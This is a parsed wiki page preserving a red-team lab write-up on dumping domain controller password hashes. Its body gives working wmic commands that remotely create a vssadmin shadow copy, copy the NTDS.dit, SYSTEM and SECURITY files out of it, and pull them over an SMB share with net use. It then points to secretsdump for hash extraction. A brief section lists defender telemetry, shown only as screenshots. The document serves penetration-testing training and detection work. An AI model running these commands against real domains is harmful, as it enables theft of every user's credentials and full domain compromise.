---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping Domain Controller Hashes via wmic and Vssadmin Shadow Copy

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

This quick labs hows how to dump all user hashes from the DC by creating a shadow copy of the C drive using vssadmin - remotely.

## Preserved Body

````markdown
This quick labs hows how to dump all user hashes from the DC by creating a shadow copy of the C drive using vssadmin - remotely.

This lab assumes the attacker has already gained administratrative access to the domain controller.

## Execution

Create a shadow copy of the C drive of the Domain Controller:
```csharp
wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
```
![](<../../_assets/Annotation 2019-05-23 213609.png>)

Copy the NTDS.dit, SYSTEM and SECURITY hives to C:\temp on the DC01:
```csharp
wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
```
Below shows the above command executed on the attacking machine (right) and the files being dumped to c:\temp on the DC01 on the left:

![](<../../_assets/dc-dump (1).gif>)

Mount the DC01\c$\temp locally in order to retrieve the dumped files:
```csharp
net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
```
![](<../../_assets/Annotation 2019-05-23 222654.png>)

Now, of you go extracting hashes with secretsdump as shown here:
[ntds.dit-enumeration.md](ntds.dit-enumeration.md)
## Observations

A quick note for defenders on the proces ancestry:

![](<../../_assets/Annotation 2019-05-23 213352.png>)

and of course commandlines:

![](<../../_assets/Annotation 2019-05-23 223432.png>)

as well as service states:

![](<../../_assets/Annotation 2019-05-23 223157.png>)

...and of course the lateral movement piece:

![](<../../_assets/Annotation 2019-05-23 230027.png>)

## References

[https://twitter.com/netmux/status/1123936748000690178?s=12](https://twitter.com/netmux/status/1123936748000690178?s=12)
````

## Source Verification

[source record](../../sources/redteamingtactics/dumping-domain-controller-hashes-via-wmic-and-vssadmin-shadow-copy.md)

## Evidence Excerpt

```text
_asset_filenames:
- Annotation 2019-05-23 213352.png
- Annotation 2019-05-23 213609.png
- Annotation 2019-05-23 222654.png
- Annotation 2019-05-23 223157.png
- Annotation 2019-05-23 223432.png
- Annotation 2019-05-23 230027.png
- dc-dump (1).gif
```
